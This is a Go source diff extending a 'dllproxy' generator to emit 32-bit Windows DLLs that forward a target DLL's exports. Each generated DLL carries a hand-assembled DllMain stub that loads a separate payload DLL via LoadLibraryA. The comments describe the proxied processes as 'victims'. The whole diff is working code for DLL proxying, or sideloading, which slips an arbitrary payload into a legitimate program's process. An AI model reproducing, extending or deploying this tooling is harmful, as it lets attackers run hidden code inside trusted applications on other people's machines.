@@ -14,9 +14,11 @@ import (
 type Machine uint16
 
 const (
-	// MachineAMD64 emits a PE32+ x86-64 DLL. Default and only Phase 1 target.
+	// MachineAMD64 emits a PE32+ x86-64 DLL. Default.
 	MachineAMD64 Machine = pe.IMAGE_FILE_MACHINE_AMD64
-	// MachineI386 is reserved for Phase 3 — 32-bit support.
+	// MachineI386 emits a PE32 x86 DLL — for proxying 32-bit (WOW64)
+	// victims. Same forwarder semantics as AMD64; 28-byte stdcall stub
+	// in the payload-load path.
 	MachineI386 Machine = pe.IMAGE_FILE_MACHINE_I386
 )
 
@@ -94,8 +96,11 @@ var (
 	ErrEmptyExports = errors.New("dllproxy: at least one export required")
 	// ErrEmptyTargetName is returned when targetName is blank.
 	ErrEmptyTargetName = errors.New("dllproxy: target name required")
-	// ErrI386NotSupported is returned for MachineI386 — Phase 3 work.
-	ErrI386NotSupported = errors.New("dllproxy: MachineI386 not yet implemented (phase 3)")
+	// ErrUnsupportedMachine is returned when [Options.Machine] is set to
+	// a value the emitter doesn't know how to produce. Currently
+	// MachineAMD64 (PE32+) and MachineI386 (PE32) are recognised; any
+	// other value triggers this error.
+	ErrUnsupportedMachine = errors.New("dllproxy: unsupported Machine")
 	// ErrInvalidExport is returned when an Export passed to GenerateExt
 	// is unusable — both Name and Ordinal blank, or duplicate ordinals.
 	ErrInvalidExport = errors.New("dllproxy: invalid export")
@@ -177,8 +182,8 @@ func GenerateExt(targetName string, exports []Export, opts Options) ([]byte, err
 	if opts.Machine == 0 {
 		opts.Machine = MachineAMD64
 	}
-	if opts.Machine != MachineAMD64 {
-		return nil, fmt.Errorf("%w: got %s", ErrI386NotSupported, opts.Machine)
+	if opts.Machine != MachineAMD64 && opts.Machine != MachineI386 {
+		return nil, fmt.Errorf("%w: %s", ErrUnsupportedMachine, opts.Machine)
 	}
 
 	normalised, err := normaliseExports(exports)
@@ -261,7 +266,15 @@ func assembleWithPayload(targetName string, sortedExports []Export, opts Options
 	importPart, irng := buildImportData(opts.PayloadDLL, rdataVA+exportSize)
 	rdata := append(exportPart, importPart...)
 
-	textBytes := buildDllMainStub(irng.payloadStringRVA, irng.iatRVA, textVA)
+	var textBytes []byte
+	if opts.Machine == MachineI386 {
+		textBytes = buildDllMainStubI386(
+			imageBase32+irng.payloadStringRVA,
+			imageBase32+irng.iatRVA,
+		)
+	} else {
+		textBytes = buildDllMainStub(irng.payloadStringRVA, irng.iatRVA, textVA)
+	}
 
 	var dataDirs [16]pe.DataDirectory
 	dataDirs[pe.IMAGE_DIRECTORY_ENTRY_EXPORT] = pe.DataDirectory{
@@ -290,21 +303,32 @@ const (
 	dosMagic    = 0x5A4D     // "MZ"
 	peSignature = 0x00004550 // "PE\0\0"
 
-	imageFileCharacteristics   = pe.IMAGE_FILE_EXECUTABLE_IMAGE | pe.IMAGE_FILE_LARGE_ADDRESS_AWARE | pe.IMAGE_FILE_DLL
+	imageFileCharacteristics64 = pe.IMAGE_FILE_EXECUTABLE_IMAGE | pe.IMAGE_FILE_LARGE_ADDRESS_AWARE | pe.IMAGE_FILE_DLL
+	// imageFileCharacteristics32 mirrors the 64-bit set minus
+	// LARGE_ADDRESS_AWARE (irrelevant on x86) plus IMAGE_FILE_32BIT_MACHINE
+	// — the standard COFF flag declaring a 32-bit-only image.
+	imageFileCharacteristics32 = pe.IMAGE_FILE_EXECUTABLE_IMAGE | pe.IMAGE_FILE_32BIT_MACHINE | pe.IMAGE_FILE_DLL
+
 	imageDLLCharacteristicsNXC = pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT
 	imageRDataCharacteristics  = pe.IMAGE_SCN_CNT_INITIALIZED_DATA | pe.IMAGE_SCN_MEM_READ
 	imageTextCharacteristics   = pe.IMAGE_SCN_CNT_CODE | pe.IMAGE_SCN_MEM_EXECUTE | pe.IMAGE_SCN_MEM_READ
-	imageOptionalHdr64Magic    = 0x020B // not exposed by stdlib debug/pe
-	imageNumberOfDirectoryRVAs = 16     // not exposed by stdlib debug/pe
+
+	// stdlib debug/pe omits the optional-header magic constants and the
+	// data-directory count, so we declare them locally.
+	imageOptionalHdr32Magic    = 0x010B
+	imageOptionalHdr64Magic    = 0x020B
+	imageNumberOfDirectoryRVAs = 16
 
 	dosHeaderSize      = 64
 	coffHeaderSize     = 20
+	optionalHeader32Sz = 224
 	optionalHeader64Sz = 240
 	sectionHeaderSize  = 40
 
 	fileAlignment    = 0x200
 	sectionAlignment = 0x1000
-	imageBase64      = 0x180000000
+	imageBase32      = 0x10000000  // canonical x86 DLL base
+	imageBase64      = 0x180000000 // canonical x64 DLL base
 )
 
 // section is a thin layout descriptor used by the multi-section
@@ -447,7 +471,15 @@ func forwarderPrefix(scheme PathScheme, targetName string) string {
 func assemblePE(secs []section, addressOfEntryPoint uint32, dataDirs [16]pe.DataDirectory, machine Machine) []byte {
 	const peHeaderOffset = dosHeaderSize // e_lfanew = 0x40
 
-	headersEnd := uint32(peHeaderOffset+4+coffHeaderSize+optionalHeader64Sz) + uint32(len(secs))*sectionHeaderSize
+	is32 := machine == MachineI386
+	optHdrSize := uint32(optionalHeader64Sz)
+	coffChars := uint16(imageFileCharacteristics64)
+	if is32 {
+		optHdrSize = optionalHeader32Sz
+		coffChars = imageFileCharacteristics32
+	}
+
+	headersEnd := uint32(peHeaderOffset+4+coffHeaderSize) + optHdrSize + uint32(len(secs))*sectionHeaderSize
 	sizeOfHeaders := alignUp(headersEnd, fileAlignment)
 
 	// Compute file offset and raw size for each section.
@@ -472,49 +504,84 @@ func assemblePE(secs []section, addressOfEntryPoint uint32, dataDirs [16]pe.Data
 	last := secs[len(secs)-1]
 	imageSize := alignUp(last.rva+uint32(len(last.contents)), sectionAlignment)
 
+	// First-of-kind RVAs for BaseOfCode / BaseOfData. RVA 0 is reserved
+	// for the headers (sectionAlignment puts the first section at
+	// 0x1000), so checking against 0 is safe as a "not yet seen" marker.
 	codeRVA := uint32(0)
+	dataRVA := uint32(0)
 	for _, s := range secs {
-		if s.characteristics&pe.IMAGE_SCN_CNT_CODE != 0 {
+		if codeRVA == 0 && s.characteristics&pe.IMAGE_SCN_CNT_CODE != 0 {
 			codeRVA = s.rva
-			break
+		}
+		if dataRVA == 0 && s.characteristics&pe.IMAGE_SCN_CNT_INITIALIZED_DATA != 0 {
+			dataRVA = s.rva
 		}
 	}
 
 	coff := pe.FileHeader{
 		Machine:              uint16(machine),
 		NumberOfSections:     uint16(len(secs)),
-		SizeOfOptionalHeader: optionalHeader64Sz,
-		Characteristics:      imageFileCharacteristics,
-	}
-	opt := pe.OptionalHeader64{
-		Magic:                       imageOptionalHdr64Magic,
-		MajorLinkerVersion:          14,
-		SizeOfCode:                  sumCode,
-		SizeOfInitializedData:       sumInitData,
-		AddressOfEntryPoint:         addressOfEntryPoint,
-		BaseOfCode:                  codeRVA,
-		ImageBase:                   imageBase64,
-		SectionAlignment:            sectionAlignment,
-		FileAlignment:               fileAlignment,
-		MajorOperatingSystemVersion: 6,
-		MajorSubsystemVersion:       6,
-		SizeOfImage:                 imageSize,
-		SizeOfHeaders:               sizeOfHeaders,
-		Subsystem:                   pe.IMAGE_SUBSYSTEM_WINDOWS_GUI,
-		DllCharacteristics:          imageDLLCharacteristicsNXC,
-		SizeOfStackReserve:          0x100000,
-		SizeOfStackCommit:           0x1000,
-		SizeOfHeapReserve:           0x100000,
-		SizeOfHeapCommit:            0x1000,
-		NumberOfRvaAndSizes:         imageNumberOfDirectoryRVAs,
-		DataDirectory:               dataDirs,
+		SizeOfOptionalHeader: uint16(optHdrSize),
+		Characteristics:      coffChars,
 	}
 
 	hdr := bytes.NewBuffer(make([]byte, 0, sizeOfHeaders))
 	hdr.Write(make([]byte, peHeaderOffset)) // DOS header zero-pad — patched below
 	binary.Write(hdr, binary.LittleEndian, uint32(peSignature))
 	binary.Write(hdr, binary.LittleEndian, &coff)
-	binary.Write(hdr, binary.LittleEndian, &opt)
+
+	if is32 {
+		opt := pe.OptionalHeader32{
+			Magic:                       imageOptionalHdr32Magic,
+			MajorLinkerVersion:          14,
+			SizeOfCode:                  sumCode,
+			SizeOfInitializedData:       sumInitData,
+			AddressOfEntryPoint:         addressOfEntryPoint,
+			BaseOfCode:                  codeRVA,
+			BaseOfData:                  dataRVA,
+			ImageBase:                   imageBase32,
+			SectionAlignment:            sectionAlignment,
+			FileAlignment:               fileAlignment,
+			MajorOperatingSystemVersion: 6,
+			MajorSubsystemVersion:       6,
+			SizeOfImage:                 imageSize,
+			SizeOfHeaders:               sizeOfHeaders,
+			Subsystem:                   pe.IMAGE_SUBSYSTEM_WINDOWS_GUI,
+			DllCharacteristics:          imageDLLCharacteristicsNXC,
+			SizeOfStackReserve:          0x100000,
+			SizeOfStackCommit:           0x1000,
+			SizeOfHeapReserve:           0x100000,
+			SizeOfHeapCommit:            0x1000,
+			NumberOfRvaAndSizes:         imageNumberOfDirectoryRVAs,
+			DataDirectory:               dataDirs,
+		}
+		binary.Write(hdr, binary.LittleEndian, &opt)
+	} else {
+		opt := pe.OptionalHeader64{
+			Magic:                       imageOptionalHdr64Magic,
+			MajorLinkerVersion:          14,
+			SizeOfCode:                  sumCode,
+			SizeOfInitializedData:       sumInitData,
+			AddressOfEntryPoint:         addressOfEntryPoint,
+			BaseOfCode:                  codeRVA,
+			ImageBase:                   imageBase64,
+			SectionAlignment:            sectionAlignment,
+			FileAlignment:               fileAlignment,
+			MajorOperatingSystemVersion: 6,
+			MajorSubsystemVersion:       6,
+			SizeOfImage:                 imageSize,
+			SizeOfHeaders:               sizeOfHeaders,
+			Subsystem:                   pe.IMAGE_SUBSYSTEM_WINDOWS_GUI,
+			DllCharacteristics:          imageDLLCharacteristicsNXC,
+			SizeOfStackReserve:          0x100000,
+			SizeOfStackCommit:           0x1000,
+			SizeOfHeapReserve:           0x100000,
+			SizeOfHeapCommit:            0x1000,
+			NumberOfRvaAndSizes:         imageNumberOfDirectoryRVAs,
+			DataDirectory:               dataDirs,
+		}
+		binary.Write(hdr, binary.LittleEndian, &opt)
+	}
 	for i, s := range secs {
 		sh := pe.SectionHeader32{
 			Name:             secNameBytes(s.name),
@@ -674,5 +741,42 @@ func buildDllMainStub(payloadStringRVA, iatEntryRVA, textRVA uint32) []byte {
 	binary.LittleEndian.PutUint32(stub[12:], uint32(leaDisp))
 	callDisp := int32(iatEntryRVA) - int32(textRVA+22)
 	binary.LittleEndian.PutUint32(stub[18:], uint32(callDisp))
+	return stub
+}
+
+// buildDllMainStubI386 emits a 28-byte x86 entry-point that mirrors
+// [buildDllMainStub] for 32-bit images. x86 has no RIP-relative
+// addressing, so the stub embeds absolute virtual addresses
+// (ImageBase + RVA) — safe because the emitter keeps
+// IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE off.
+//
+// Calling convention: stdcall. DllMain on x86 is
+// `BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID)` with all
+// three args on the stack (right-to-left). The stub reads `reason`
+// from `[esp+8]` (skipping over the return address at `[esp]` and
+// HINSTANCE at `[esp+4]`), calls LoadLibraryA on ATTACH, then returns
+// TRUE via stdcall `ret 0Ch` (pops the 12 bytes of args).
+//
+// Layout (28 bytes total):
+//
+//	00  mov eax, [esp+8]              8B 44 24 08
+//	04  cmp eax, 1                    83 F8 01
+//	07  jne ret_true (+11)            75 0B
+//	09  push <payload_str_abs>        68 xx xx xx xx
+//	14  call dword ptr [<iat_abs>]    FF 15 xx xx xx xx
+//	20  mov eax, 1                    B8 01 00 00 00
+//	25  ret 0Ch                       C2 0C 00
+func buildDllMainStubI386(payloadStringAbs, iatEntryAbs uint32) []byte {
+	stub := []byte{
+		0x8B, 0x44, 0x24, 0x08, // mov eax, [esp+8]
+		0x83, 0xF8, 0x01, // cmp eax, 1
+		0x75, 0x0B, // jne +11 (target = offset 20)
+		0x68, 0, 0, 0, 0, // push imm32 (patch @ off 10)
+		0xFF, 0x15, 0, 0, 0, 0, // call dword ptr [imm32] (patch @ off 16)
+		0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1
+		0xC2, 0x0C, 0x00, // ret 0Ch (stdcall, pops 3*4 bytes of args)
+	}
+	binary.LittleEndian.PutUint32(stub[10:], payloadStringAbs)
+	binary.LittleEndian.PutUint32(stub[16:], iatEntryAbs)
 	return stub
 }
